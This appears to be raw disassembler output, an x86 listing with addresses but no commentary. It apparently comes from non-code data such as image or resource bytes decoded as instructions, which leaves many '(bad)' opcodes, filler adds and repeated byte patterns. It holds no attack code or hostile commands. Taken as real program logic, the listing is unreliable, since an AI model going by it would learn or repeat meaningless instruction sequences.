110179da:	inc    ebp
110179db:	cli    
110179dc:	add    BYTE PTR [eax],al
110179de:	add    BYTE PTR [eax+0x0],ah
110179e1:	add    BYTE PTR [eax],al
110179e3:	add    al,0x0
110179e5:	add    BYTE PTR [eax],al
110179e7:	popa   
110179e8:	inc    esi
110179e9:	inc    esi
110179ea:	inc    esi
110179eb:	cli    
110179ec:	hlt    
110179ed:	hlt    
110179ee:	hlt    
110179ef:	(bad)  
110179f0:	(bad)  
110179f1:	(bad)  
110179f2:	std    
110179f3:	(bad)  
110179f4:	(bad)  
110179f5:	(bad)  
110179f6:	std    
110179f7:	(bad)  
110179f8:	clc    
110179f9:	mov    ebx,0xbdf8ff9f
110179fe:	mov    ds:0xb2c8f9ff,al
11017a03:	(bad)  
11017a04:	clc    
11017a05:	(bad)  
11017a06:	scas   eax,DWORD PTR es:[edi]
11017a07:	push   edi
11017a09:	mov    ebx,0xacf6ffa0
11017a0e:	mov    bh,bh
11017a10:	cmc    
11017a11:	sahf   
11017a12:	ja     0x11017a13
11017a14:	repnz xchg ebx,eax
11017a16:	imul   edi,edi,0xff5d88ed
11017a1c:	call   0xf400cc9f
11017a21:	jne    0x11017a6d
11017a23:	jmp    ebp
11017a25:	mov    WORD PTR [ebx-0x1],gs
11017a28:	(bad)  
11017a29:	(bad)  
11017a2a:	std    
11017a2b:	(bad)  
11017a2c:	(bad)  
11017a2d:	(bad)  
11017a2e:	std    
11017a2f:	push   esp
11017a31:	hlt    
11017a32:	hlt    
11017a33:	inc    DWORD PTR [ebp+0x45]
11017a36:	inc    ebp
11017a37:	cld    
11017a38:	add    BYTE PTR [eax],al
11017a3a:	add    BYTE PTR [esi+0x0],dh
11017a3d:	add    BYTE PTR [eax],al
11017a3f:	or     BYTE PTR [eax],al
11017a41:	add    BYTE PTR [eax],al
11017a43:	add    BYTE PTR [eax],al
11017a45:	add    BYTE PTR [eax],al
11017a47:	add    eax,0x67000000
11017a4c:	inc    esi
11017a4d:	inc    esi
11017a4e:	inc    esi
11017a4f:	push   ebp
11017a51:	cmc    
11017a52:	hlt    
11017a53:	(bad)  
11017a54:	std    
11017a55:	std    
11017a56:	std    
11017a57:	(bad)  
11017a58:	sti    
11017a59:	fst    st(0)
11017a5b:	(bad)  
11017a5c:	clc    
11017a5d:	(bad)  
11017a5e:	mov    al,0xff
11017a60:	cli    
11017a61:	xlat   BYTE PTR ds:[ebx]
11017a62:	enter  0xfaff,0xd6
11017a66:	(bad)  
11017a69:	(bad)  
11017a6a:	mov    al,0xff
11017a6c:	div    DWORD PTR [ebx-0x5c09006b]
11017a72:	jge    0x11017a73
11017a74:	hlt    
11017a75:	xchg   edi,eax
11017a76:	ins    DWORD PTR es:[edi],dx
11017a77:	push   ebx
11017a79:	(bad)  
11017a7a:	arpl   di,di
11017a7c:	out    dx,al
11017a7d:	xchg   BYTE PTR [ecx-0x1],bl
11017a80:	call   0x500ca01
11017a85:	ret    
11017a86:	mov    al,0xff
11017a88:	std    
11017a89:	std    
11017a8a:	std    
11017a8b:	push   ebp
11017a8d:	cmc    
11017a8e:	hlt    
11017a8f:	inc    DWORD PTR [ebp+0x45]
11017a92:	inc    ebp
11017a93:	inc    DWORD PTR [eax]
11017a95:	add    BYTE PTR [eax],al
11017a97:	mov    edx,0x30000000
11017a9c:	add    BYTE PTR [eax],al
11017a9e:	add    BYTE PTR [ebx],al
	...
11017aa8:	add    BYTE PTR [eax],al
11017aaa:	add    BYTE PTR [ebx],dl
11017aac:	adc    DWORD PTR [ecx],ecx
11017aae:	push   es
11017aaf:	dec    DWORD PTR [edx+0x48]
11017ab2:	inc    edi
11017ab3:	push   ebp
11017ab5:	cmc    
11017ab6:	hlt    
11017ab7:	(bad)  
11017ab8:	std    
11017ab9:	cld    
11017aba:	sti    
11017abb:	(bad)  
11017abc:	stc    
11017abd:	iret   
11017abe:	mov    ebx,0xc6d6faff
11017ac3:	(bad)  
11017ac4:	cli    
11017ac5:	xlat   BYTE PTR ds:[ebx]
11017ac6:	enter  0xf9ff,0xc8
11017aca:	mov    dl,0xff
11017acc:	div    DWORD PTR [esi+edx*4+0x7ea3f5ff]
11017ad3:	push   esp
11017ad5:	xchg   edi,eax
11017ad6:	ins    DWORD PTR es:[edi],dx
11017ad7:	push   esp
11017ad9:	nop
11017ada:	fs push edx
11017add:	mov    ebx,DWORD PTR [ebp-0x1]
11017ae0:	lock call 0xfff9:0xfafdff74
11017ae8:	hlt    
11017ae9:	hlt    
11017aea:	hlt    
11017aeb:	dec    DWORD PTR [edx+0x48]
11017aee:	inc    edi
11017aef:	call   DWORD PTR [ecx]
11017af1:	or     DWORD PTR [esi],eax
11017af3:	inc    DWORD PTR [eax]
11017af5:	add    BYTE PTR [eax],al
11017af7:	mov    al,ds:0x2d000000
11017afc:	add    BYTE PTR [eax],al
11017afe:	add    BYTE PTR [ebx],al
	...
11017b08:	add    BYTE PTR [eax],al
11017b0a:	add    BYTE PTR [edi],cl
11017b0c:	cmp    ah,BYTE PTR [eax]
11017b0e:	adc    eax,0x375596ff
11017b13:	dec    DWORD PTR [edx+0x48]
11017b16:	inc    edi
11017b17:	push   ebp
11017b19:	cmc    
11017b1a:	cmc    
11017b1b:	(bad)  
11017b1c:	std    
11017b1d:	div    esp
11017b1f:	(bad)  
11017b20:	stc    
11017b21:	into   
11017b22:	mov    ebx,0xb0c6f8ff
11017b27:	(bad)  
11017b28:	clc    
11017b29:	mov    ebp,0xadf6ffa2
11017b2e:	mov    edi,?
11017b30:	cmc    
11017b31:	lahf   
11017b32:	js     0x11017b33
11017b34:	hlt    
11017b35:	xchg   esp,eax
11017b36:	imul   edi,edi,0xff608ef3
11017b3c:	cmc    
11017b3d:	mov    eax,ds:0xf1fdff7a
11017b42:	in     al,dx
11017b43:	push   ebp
11017b45:	cmc    
11017b46:	hlt    
11017b47:	dec    DWORD PTR [edx+0x48]
11017b4a:	inc    edi
11017b4b:	call   DWORD PTR [edi+0x3aff3855]
11017b51:	and    BYTE PTR ds:0xff,dl
11017b57:	sahf   
11017b58:	add    BYTE PTR [eax],al
11017b5a:	add    BYTE PTR [eax+eax*1],ch
11017b5d:	add    BYTE PTR [eax],al
11017b5f:	add    eax,DWORD PTR [eax]
	...
11017b69:	add    BYTE PTR [eax],al
11017b6b:	(bad)  
11017b6d:	and    dl,BYTE PTR [esi]
11017b6f:	(bad)  
11017b70:	out    dx,al
11017b71:	xchg   BYTE PTR [eax-0x1],bl
11017b74:	xchg   esi,eax
11017b75:	push   esp
11017b76:	aaa    
11017b77:	dec    DWORD PTR [edx+0x49]
11017b7a:	dec    eax
11017b7b:	push   ebp
11017b7d:	cmc    
11017b7e:	hlt    
11017b7f:	(bad)  
11017b80:	std    
11017b81:	cld    
11017b82:	sti    
11017b83:	(bad)  
11017b84:	sti    
11017b85:	(bad)  
11017b87:	(bad)  
11017b88:	clc    
11017b89:	mov    ebx,0xa3f6ffa0
11017b8e:	jle    0x11017b8f
11017b90:	cmc    
11017b91:	fwait
11017b92:	jb     0x11017b93
11017b94:	mul    BYTE PTR [edi-0x3206007c]
11017b9a:	mov    ecx,0xf8fafdff
11017b9f:	push   ebp
11017ba1:	cmc    
11017ba2:	cmc    
11017ba3:	dec    DWORD PTR [edx+0x48]
11017ba6:	inc    edi
11017ba7:	call   DWORD PTR [edi-0x1100c7ab]
11017bad:	xchg   BYTE PTR [eax-0x1],bl
11017bb0:	cmp    al,0x22
11017bb2:	push   ss
11017bb3:	inc    DWORD PTR [eax]
11017bb5:	add    BYTE PTR [eax],al
11017bb7:	sahf   
11017bb8:	add    BYTE PTR [eax],al
11017bba:	add    BYTE PTR [eax+eax*1],ch
11017bbd:	add    BYTE PTR [eax],al
11017bbf:	add    eax,DWORD PTR [eax]
	...
11017bc9:	add    BYTE PTR [eax],al
11017bcb:	(bad)  
11017bcd:	and    dl,BYTE PTR [esi]
11017bcf:	push   ebx
11017bd1:	mov    DWORD PTR [edx-0x1],ebx
11017bd4:	out    dx,al
11017bd5:	xchg   BYTE PTR [eax-0x1],bl
11017bd8:	xchg   esi,eax
11017bd9:	push   esp
11017bda:	aaa    
11017bdb:	dec    DWORD PTR [edx+0x48]
11017bde:	inc    edi
11017bdf:	push   ebp
11017be1:	cmc    
11017be2:	hlt    
11017be3:	(bad)  
11017be4:	std    
11017be5:	std    
11017be6:	std    
11017be7:	(bad)  
11017be8:	(bad)  
11017be9:	(bad)  
11017bea:	std    
11017beb:	(bad)  
11017bec:	std    
11017bed:	std    
11017bee:	std    
11017bef:	(bad)  
11017bf0:	std    
11017bf1:	std    
11017bf2:	std    
11017bf3:	(bad)  
11017bf4:	(bad)  
11017bf5:	(bad)  
11017bf6:	(bad)  
11017bf7:	(bad)  
11017bf8:	std    
11017bf9:	std    
11017bfa:	std    
11017bfb:	push   esp
11017bfd:	hlt    
11017bfe:	hlt    
11017bff:	dec    DWORD PTR [edx+0x48]
11017c02:	inc    edi
11017c03:	call   DWORD PTR [edi-0x1100c7ab]
11017c09:	xchg   BYTE PTR [eax-0x1],bl
11017c0c:	xrelease mov DWORD PTR [edx-0x1],ebx
11017c10:	cmp    al,0x22
11017c12:	push   ss
11017c13:	inc    DWORD PTR [eax]
11017c15:	add    BYTE PTR [eax],al
11017c17:	pushf  
11017c18:	add    BYTE PTR [eax],al
11017c1a:	add    BYTE PTR [eax+eax*1],ch
11017c1d:	add    BYTE PTR [eax],al
11017c1f:	add    eax,DWORD PTR [eax]
	...
11017c29:	add    BYTE PTR [eax],al
11017c2b:	or     al,0x3d
11017c2d:	and    dl,BYTE PTR [esi]
11017c2f:	push   ebx
11017c31:	mov    DWORD PTR [edx-0x1],ebx
11017c34:	xrelease mov DWORD PTR [edx-0x1],ebx
11017c38:	out    dx,al
11017c39:	xchg   BYTE PTR [eax-0x1],bl
11017c3c:	xchg   esi,eax
11017c3d:	push   ebp
11017c3e:	aaa    
11017c3f:	dec    DWORD PTR [edx+0x48]
11017c42:	inc    edi
11017c43:	push   ebp
11017c45:	cmc    
11017c46:	hlt    
11017c47:	(bad)  
11017c48:	(bad)  
11017c49:	(bad)  
11017c4a:	std    
11017c4b:	(bad)  
11017c4c:	(bad)  
11017c4d:	(bad)  
11017c4e:	std    
11017c4f:	(bad)  
11017c50:	std    
11017c51:	std    
11017c52:	std    
11017c53:	(bad)  
11017c54:	(bad)  
11017c55:	(bad)  
11017c56:	std    
11017c57:	push   esp
11017c59:	hlt    
11017c5a:	hlt    
11017c5b:	dec    DWORD PTR [edx+0x48]
11017c5e:	inc    edi
11017c5f:	call   DWORD PTR [edi-0x1100c7ab]
11017c65:	xchg   BYTE PTR [eax-0x1],bl
11017c68:	xrelease mov DWORD PTR [edx-0x1],ebx
11017c6c:	xrelease mov DWORD PTR [edx-0x1],ebx
11017c70:	cmp    al,0x22
11017c72:	push   ss
11017c73:	inc    DWORD PTR [eax]
11017c75:	add    BYTE PTR [eax],al
11017c77:	add    DWORD PTR [eax],0x0
11017c7a:	add    BYTE PTR ds:0x2000000,ah
	...
11017c88:	add    BYTE PTR [eax],al
11017c8a:	add    BYTE PTR [esi],al
11017c8c:	invd   
11017c8e:	add    eax,0x16223dff
11017c93:	(bad)  
11017c94:	cmp    eax,0x3cff1622
11017c99:	and    dl,BYTE PTR [esi]
11017c9b:	(bad)  
11017c9c:	cmp    ah,BYTE PTR [eax]
11017c9e:	adc    eax,0x60911ff
11017ca3:	inc    DWORD PTR [esi+0x46]
11017ca6:	inc    esi
11017ca7:	push   esp
11017ca9:	hlt    
11017caa:	hlt    
11017cab:	(bad)  
11017cac:	std    
11017cad:	std    
11017cae:	std    
11017caf:	(bad)  
11017cb0:	std    
11017cb1:	std    
11017cb2:	std    
11017cb3:	push   ebp
11017cb5:	cmc    
11017cb6:	cmc    
11017cb7:	inc    DWORD PTR [ebp+0x45]
11017cba:	inc    ebp
11017cbb:	call   DWORD PTR [ecx]
11017cbd:	or     DWORD PTR [esi],eax
11017cbf:	(bad)  
11017cc0:	cmp    ah,BYTE PTR [eax]
11017cc2:	adc    eax,0x16223cff
11017cc7:	(bad)  
11017cc8:	cmp    al,0x22
11017cca:	push   ss
11017ccb:	(bad)  
11017ccc:	cmp    al,0x22
11017cce:	push   ss
11017ccf:	dec    DWORD PTR [edi]
11017cd1:	or     BYTE PTR ds:0xff,al
11017cd7:	cmp    al,0x0
11017cd9:	add    BYTE PTR [eax],al
11017cdb:	adc    DWORD PTR [eax],eax
11017cdd:	add    BYTE PTR [eax],al
11017cdf:	add    DWORD PTR [eax],eax
	...
11017ced:	add    BYTE PTR [eax],al
11017cef:	push   es
11017cf0:	add    BYTE PTR [eax],al
11017cf2:	add    BYTE PTR [eax+eax*1],cl
11017cf5:	add    BYTE PTR [eax],al
11017cf7:	push   cs
11017cf8:	add    BYTE PTR [eax],al
11017cfa:	add    BYTE PTR [edi],cl
11017cfc:	add    BYTE PTR [eax],al
11017cfe:	add    BYTE PTR [edi],cl
11017d00:	add    BYTE PTR [eax],al
11017d02:	add    BYTE PTR [ebx],dl
11017d04:	add    BYTE PTR [eax],al
11017d06:	add    BYTE PTR [edi+0x46],ah
11017d09:	inc    esi
11017d0a:	inc    esi
11017d0b:	cli    
11017d0c:	cmc    
11017d0d:	cmc    
11017d0e:	cmc    
11017d0f:	push   esp
11017d11:	hlt    
11017d12:	hlt    
11017d13:	inc    DWORD PTR [ebp+0x45]
11017d16:	inc    ebp
11017d17:	stc    
11017d18:	add    BYTE PTR [eax],al
11017d1a:	add    BYTE PTR [esi+0x0],ah
11017d1d:	add    BYTE PTR [eax],al
11017d1f:	adc    eax,DWORD PTR [eax]
11017d21:	add    BYTE PTR [eax],al
11017d23:	sldt   WORD PTR [eax]
11017d26:	add    BYTE PTR [edi],cl
11017d28:	add    BYTE PTR [eax],al
11017d2a:	add    BYTE PTR [edi],cl
11017d2c:	add    BYTE PTR [eax],al
11017d2e:	add    BYTE PTR [edi],cl
11017d30:	add    BYTE PTR [eax],al
11017d32:	add    BYTE PTR [esi],cl
11017d34:	add    BYTE PTR [eax],al
11017d36:	add    BYTE PTR [ecx],cl
11017d38:	add    BYTE PTR [eax],al
11017d3a:	add    BYTE PTR [edx],al
	...
11017d64:	add    BYTE PTR [eax],al
11017d66:	add    BYTE PTR ds:0x60000000,al
11017d6c:	inc    esi
11017d6d:	inc    esi
11017d6e:	inc    esi
11017d6f:	stc    
11017d70:	inc    ebp
11017d71:	inc    ebp
11017d72:	inc    ebp
11017d73:	stc    
11017d74:	add    BYTE PTR [eax],al
11017d76:	add    BYTE PTR [edi+0x0],bl
11017d79:	add    BYTE PTR [eax],al
11017d7b:	add    eax,0x0
	...
11017dc8:	add    BYTE PTR [eax],al
11017dca:	add    BYTE PTR [eax+eax*1],al
11017dcd:	add    BYTE PTR [eax],al
11017dcf:	pop    eax
11017dd0:	add    BYTE PTR [eax],al
11017dd2:	add    BYTE PTR [edi+0x0],dl
11017dd5:	add    BYTE PTR [eax],al
11017dd7:	add    al,0x0
	...
11017dfd:	add    BYTE PTR [eax],al
11017dff:	add    al,ah
11017e01:	add    BYTE PTR [ebx],al
11017e03:	inc    ecx
11017e04:	rol    BYTE PTR [eax],0x1
11017e07:	inc    ecx
11017e08:	rol    BYTE PTR [eax],0x0
11017e0b:	inc    ecx
11017e0c:	rol    BYTE PTR [eax],0x0
11017e0f:	inc    ecx
11017e10:	rol    BYTE PTR [eax],0x0
11017e13:	inc    ecx
11017e14:	rol    BYTE PTR [eax],0x0
11017e17:	inc    ecx
11017e18:	rol    BYTE PTR [eax],0x0
11017e1b:	inc    ecx
11017e1c:	add    BYTE PTR [eax],0x0
11017e1f:	inc    ecx
11017e20:	add    BYTE PTR [eax],al
11017e22:	add    BYTE PTR [ecx+0x0],al
11017e25:	add    BYTE PTR [eax],al
11017e27:	inc    ecx
11017e28:	add    BYTE PTR [eax],al
11017e2a:	add    BYTE PTR [ecx+0x0],al
11017e2d:	add    BYTE PTR [eax],al
11017e2f:	inc    ecx
11017e30:	add    BYTE PTR [eax],al
11017e32:	add    BYTE PTR [ecx+0x0],al
11017e35:	add    BYTE PTR [eax],al
11017e37:	inc    ecx
11017e38:	add    BYTE PTR [eax],0x0
11017e3b:	inc    ecx
11017e3c:	rol    BYTE PTR [eax],0x0
11017e3f:	inc    ecx
11017e40:	rol    BYTE PTR [eax],0x0
11017e43:	inc    ecx
11017e44:	rol    BYTE PTR [eax],0x0
11017e47:	inc    ecx
11017e48:	rol    BYTE PTR [eax],0x0
11017e4b:	inc    ecx
11017e4c:	rol    BYTE PTR [eax],0x0
11017e4f:	inc    ecx
11017e50:	rol    BYTE PTR [eax],0x0
11017e53:	inc    ecx
11017e54:	loopne 0x11017e56
11017e56:	add    DWORD PTR [ecx-0x1],eax
11017e59:	cmp    edi,0xffc3ff41
11017e5f:	inc    ecx
11017e60:	sub    BYTE PTR [eax],al
11017e62:	add    BYTE PTR [eax],al
11017e64:	adc    BYTE PTR [eax],al
11017e66:	add    BYTE PTR [eax],al
11017e68:	and    BYTE PTR [eax],al
11017e6a:	add    BYTE PTR [eax],al
11017e6c:	add    DWORD PTR [eax],eax
11017e6e:	and    BYTE PTR [eax],al
	...
11017e90:	add    BYTE PTR [eax],al
11017e92:	add    BYTE PTR ds:0xa000000,al
11017e98:	add    BYTE PTR [eax],al
11017e9a:	add    BYTE PTR [edx],cl
11017e9c:	add    BYTE PTR [eax],al
11017e9e:	add    BYTE PTR [ebx],dl
11017ea0:	add    BYTE PTR [eax],al
11017ea2:	add    BYTE PTR [edx+0x3],dl
11017ea5:	add    eax,DWORD PTR [ebx]
11017ea7:	mov    DWORD PTR [ebx],0xc70303
11017ead:	add    BYTE PTR [eax],al
11017eaf:	push   edx
11017eb0:	add    BYTE PTR [eax],al
11017eb2:	add    BYTE PTR [edx],dl
11017eb4:	add    BYTE PTR [eax],al
11017eb6:	add    BYTE PTR [edx],cl
11017eb8:	add    BYTE PTR [eax],al
11017eba:	add    BYTE PTR [edx],cl
11017ebc:	add    BYTE PTR [eax],al
11017ebe:	add    BYTE PTR [edx],cl
11017ec0:	add    BYTE PTR [eax],al
11017ec2:	add    BYTE PTR ds:0x0,al
11017ec8:	add    BYTE PTR [eax],al
11017eca:	add    BYTE PTR [eax],al
11017ecc:	add    BYTE PTR [eax],al
11017ece:	add    BYTE PTR ds:0x40000000,al
11017ed4:	add    BYTE PTR [eax],al
11017ed6:	add    BYTE PTR [edx+0x0],bh
11017ed9:	add    BYTE PTR [eax],al
11017edb:	add    DWORD PTR [eax],0x0
11017ede:	add    BYTE PTR [edi-0x22fcfcfd],bl
11017ee4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
11017ee5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
11017ee6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
11017ee7:	jmp    DWORD PTR [ebx+0x3ffa3a3]
11017eed:	add    eax,DWORD PTR [ebx]
11017eef:	fld    QWORD PTR [eax]
11017ef1:	add    BYTE PTR [eax],al
11017ef3:	lahf   
11017ef4:	add    BYTE PTR [eax],al
11017ef6:	add    BYTE PTR [edx+0x7f000000],al
11017efc:	add    BYTE PTR [eax],al
11017efe:	add    BYTE PTR [edx+0x0],bh
11017f01:	add    BYTE PTR [eax],al
11017f03:	inc    eax
11017f04:	add    BYTE PTR [eax],al
11017f06:	add    BYTE PTR ds:0x0,al
11017f0c:	add    BYTE PTR [eax],al
11017f0e:	add    BYTE PTR [edx],cl
11017f10:	cmp    al,0x22
11017f12:	push   ss
11017f13:	push   DWORD PTR [edx+0x40]
11017f16:	sub    bh,bh
11017f18:	dec    eax
11017f19:	sub    BYTE PTR [edx],bl
11017f1b:	dec    DWORD PTR [edi]
11017f1d:	or     DWORD PTR [edi],eax
11017f1f:	jmp    DWORD PTR [esp+eiz*4-0x202005c]
11017f26:	std    
11017f27:	(bad)  
11017f28:	std    
11017f29:	std    
11017f2a:	std    
11017f2b:	jmp    DWORD PTR [ebx+0xeffa3a3]
11017f31:	or     DWORD PTR [edi],eax
11017f33:	dec    DWORD PTR [eax+0x28]
11017f36:	sbb    bh,bh
11017f38:	jb     0x11017f7a
11017f3a:	sub    bh,bh
11017f3c:	cmp    al,0x22
11017f3e:	push   ss
11017f3f:	inc    DWORD PTR [eax]
11017f41:	add    BYTE PTR [eax],al
11017f43:	jp     0x11017f45
11017f45:	add    BYTE PTR [eax],al
11017f47:	or     al,BYTE PTR [eax]
11017f49:	add    BYTE PTR [eax],al
11017f4b:	add    BYTE PTR [eax],al
11017f4d:	add    BYTE PTR [eax],al
11017f4f:	or     dh,BYTE PTR [edx+0x40]
11017f52:	sub    bh,bh
11017f54:	stos   DWORD PTR es:[edi],eax
11017f55:	pusha  
11017f56:	aas    
11017f57:	push   DWORD PTR [esi]
11017f59:	and    BYTE PTR [esi],dl
11017f5b:	jmp    DWORD PTR [esp+eiz*4-0x101005c]
11017f62:	std    
11017f63:	(bad)  
11017f64:	(bad)  
11017f65:	(bad)  
11017f66:	std    
11017f67:	(bad)  
11017f68:	(bad)  
11017f69:	(bad)  
11017f6a:	std    
11017f6b:	(bad)  
11017f6c:	(bad)  
11017f6d:	(bad)  
11017f6e:	std    
11017f6f:	jmp    DWORD PTR [ebx+0x36ffa3a3]
11017f75:	and    BYTE PTR [esi],dl
11017f77:	jmp    FWORD PTR [ebx+0x72ff3f60]
11017f7d:	inc    eax
11017f7e:	sub    bh,bh
11017f80:	add    BYTE PTR [eax],al
11017f82:	add    BYTE PTR [edi+0x0],bh
11017f85:	add    BYTE PTR [eax],al
11017f87:	or     al,BYTE PTR [eax]
11017f89:	add    BYTE PTR [eax],al
11017f8b:	add    BYTE PTR [eax],al
11017f8d:	add    BYTE PTR [eax],al
11017f8f:	adc    ecx,DWORD PTR [eax+0x28]
11017f92:	sbb    bh,bh
11017f94:	and    BYTE PTR ss:[esi],dl
11017f97:	jmp    DWORD PTR [esp+eiz*4-0x1404005c]
11017f9e:	jecxz  0x11017f9f
11017fa0:	in     al,dx
11017fa1:	mov    eax,ds:0x72ddff82
11017fa6:	dec    ebx
11017fa7:	call   ebp
11017fa9:	push   0x8cdcff43
11017fae:	jb     0x11017faf
11017fb0:	mul    bl
11017fb2:	(bad)  
11017fb4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
11017fb5:	mov    ds:0x2036ffa3,eax
11017fba:	push   ss
11017fbb:	dec    DWORD PTR [eax+0x28]
11017fbe:	sbb    bh,bh
11017fc0:	add    BYTE PTR [eax],al
11017fc2:	add    BYTE PTR [edx+0xa000000],al
11017fc8:	add    BYTE PTR [eax],al
11017fca:	add    BYTE PTR [ecx],cl
11017fcc:	add    BYTE PTR [eax],al
11017fce:	add    BYTE PTR [edx+0xf],dl
11017fd1:	or     DWORD PTR [edi],eax
11017fd3:	jmp    DWORD PTR [esp+eiz*4-0x1303005c]
11017fda:	in     eax,0xff
11017fdc:	repnz xchg ecx,eax
11017fde:	data16 (bad) 
11017fe0:	jmp    0x11017f63
11017fe2:	push   ebp
11017fe3:	jmp    ebx
11017fe5:	ja     0x11018033
11017fe7:	(bad)  
11017fe8:	fld    TBYTE PTR [ebx+0x43]
11017feb:	call   ebx
11017fed:	pusha  
11017fee:	cmp    edi,edi
11017ff0:	into   
11017ff1:	popa   
11017ff2:	ds push esi
11017ff5:	jecxz  0x11017fd5
11017ff7:	jmp    DWORD PTR [ebx+0xeffa3a3]
11017ffd:	or     DWORD PTR [edi],eax
11017fff:	inc    DWORD PTR [eax]
11018001:	add    BYTE PTR [eax],al
11018003:	lahf   
11018004:	add    BYTE PTR [eax],al
11018006:	add    BYTE PTR [edx],dl
11018008:	add    BYTE PTR [eax],al
1101800a:	add    BYTE PTR [esi+0x3],al
1101800d:	add    eax,DWORD PTR [ebx]
1101800f:	retf   0xa4a4
11018012:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
11018013:	(bad)  
11018014:	(bad)  
11018015:	(bad)  
11018016:	std    
11018017:	push   edi
11018019:	mov    dl,0x92
1101801b:	push   esp
1101801d:	xchg   edx,eax
1101801e:	gs push edx
11018021:	nop
11018022:	fs (bad) 
11018024:	jmp    0x11017fac
11018026:	pop    edx
11018027:	jmp    ebx
11018029:	jns    0x11018079
1101802b:	(bad)  
1101802c:	fld    TBYTE PTR [ebx+eax*2-0x1]
11018030:	shl    DWORD PTR [eax+0x39],cl
11018033:	(bad)  
11018034:	fmul   QWORD PTR [edx+esi*2-0x2010101]
1101803b:	jmp    DWORD PTR [ebx+0x3ffa3a3]
11018041:	add    eax,DWORD PTR [ebx]
11018043:	fld    QWORD PTR [eax]
11018045:	add    BYTE PTR [eax],al
11018047:	dec    esp
11018048:	add    eax,DWORD PTR [ebx]
1101804a:	add    ebx,DWORD PTR [esp+eiz*4-0x2015b5c]
11018051:	std    
11018052:	std    
11018053:	(bad)  
11018054:	(bad)  
11018055:	(bad)  
11018056:	(bad)  
11018057:	push   ebp
11018059:	popf   
1101805a:	je     0x1101805b
1101805c:	cmc    
1101805d:	lahf   
1101805e:	jns    0x1101805f
11018060:	cmc    
11018061:	lahf   
11018062:	js     0x11018063
11018064:	repz xchg edi,eax
11018066:	outs   dx,BYTE PTR ds:[esi]
11018067:	(bad)  
11018068:	in     al,dx
11018069:	mov    BYTE PTR [ebp-0x1],bl
1101806c:	jecxz  0x110180e6
1101806e:	dec    esi
1101806f:	(bad)  
11018070:	fld    TBYTE PTR [ebx+eax*2-0x1]
11018074:	aad    0x68
11018076:	inc    ebx
11018077:	(bad)  
11018078:	(bad)  
11018079:	(bad)  
1101807a:	std    
1101807b:	(bad)  
1101807c:	(bad)  
1101807d:	(bad)  
1101807e:	std    
1101807f:	jmp    DWORD PTR [ebx+0x3fea3a3]
11018085:	add    eax,DWORD PTR [ebx]
11018087:	popf   
11018088:	add    eax,DWORD PTR [ebx]
1101808a:	add    ebp,DWORD PTR [edx-0x5c]
1101808d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
1101808e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
1101808f:	std    
11018090:	std    
11018091:	std    
11018092:	std    
11018093:	(bad)  
11018094:	(bad)  
11018095:	(bad)  
11018096:	std    
11018097:	push   esi
11018099:	stos   DWORD PTR es:[edi],eax
1101809a:	mov    bh,bh
1101809c:	clc    
1101809d:	mov    eax,0xb6f8ff9b
110180a2:	cdq    
110180a3:	push   esi
110180a5:	test   al,0x84
110180a7:	push   ebx
110180a9:	xchg   edi,eax
110180aa:	ins    DWORD PTR es:[edi],dx
110180ab:	(bad)  
110180ac:	jmp    0x11018033
110180ae:	pop    edx
110180af:	jmp    ebx
110180b1:	ja     0x110180ff
110180b3:	(bad)  
110180b4:	fnsave [edx+0x4b]
110180b7:	(bad)  
110180b8:	(bad)  
110180b9:	(bad)  
110180ba:	std    
110180bb:	(bad)  
110180bc:	(bad)  
110180bd:	(bad)  
110180be:	std    
110180bf:	jmp    DWORD PTR [esp+eiz*4+0x303fda4]
110180c6:	add    ebp,DWORD PTR [ebp+0x0]
110180c9:	add    BYTE PTR [eax],al
110180cb:	add    al,BYTE PTR [ebx]
110180cd:	add    eax,DWORD PTR [ebx]
110180cf:	outs   dx,BYTE PTR ds:[esi]
110180d0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
110180d1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
110180d2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
110180d3:	(bad)  
110180d4:	(bad)  
110180d5:	(bad)  
110180d6:	std    
110180d7:	(bad)  
110180d8:	cli    
110180d9:	int    0xb9
110180db:	(bad)  
110180dc:	cli    
110180dd:	sar    DWORD PTR [edi-0x43300501],1
110180e3:	(bad)  
110180e4:	clc    
110180e5:	mov    dh,0x99
110180e7:	push   ebp
110180e9:	lahf   
110180ea:	js     0x110180eb
110180ec:	repnz nop
110180ee:	fs (bad) 
110180f0:	jmp    0x11018074
110180f2:	push   ebp
110180f3:	(bad)  
110180f4:	in     al,dx
110180f5:	mov    eax,ds:0xfefeff82
110180fa:	std    
110180fb:	jmp    DWORD PTR [esp+eiz*4+0x303ffa4]
11018102:	add    esp,DWORD PTR [esi+0xc000000]
11018108:	add    BYTE PTR [eax],al
1101810a:	add    BYTE PTR [eax],al
1101810c:	add    BYTE PTR [eax],al
1101810e:	add    BYTE PTR [ebp*1-0x5900ede5],cl
11018115:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
11018116:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
11018117:	(bad)  
11018118:	std    
11018119:	hlt    
1101811a:	lock (bad) 
1101811c:	cli    
1101811d:	rol    al,cl
1101811f:	(bad)  
11018120:	cli    
11018121:	sar    DWORD PTR [edi-0x64470701],1
11018127:	push   ebp
11018129:	lahf   
1101812a:	jns    0x1101812b
1101812c:	hlt    
1101812d:	xchg   edx,eax
1101812e:	gs push edx
11018131:	xchg   ecx,eax
11018132:	data16 (bad) 
11018134:	sti    
11018135:	jmp    0x1101811a
11018137:	jmp    DWORD PTR [esi+0x2dffa4a5]
1101813d:	sbb    edx,DWORD PTR [ebx]
1101813f:	inc    DWORD PTR [eax]
11018141:	add    BYTE PTR [eax],al
11018143:	add    BYTE PTR [eax],0x0
11018146:	add    BYTE PTR [edx],cl
11018148:	add    BYTE PTR [eax],al
1101814a:	add    BYTE PTR [eax],al
1101814c:	add    BYTE PTR [eax],al
1101814e:	add    BYTE PTR [edx],cl
11018150:	ja     0x11018195
11018152:	sub    al,0xff
11018154:	nop
11018155:	push   ebx
11018156:	aaa    
11018157:	jmp    DWORD PTR [esi-0x2005a5a]
1101815d:	hlt    
1101815e:	lock (bad) 
11018160:	cli    
11018161:	int    0xb9
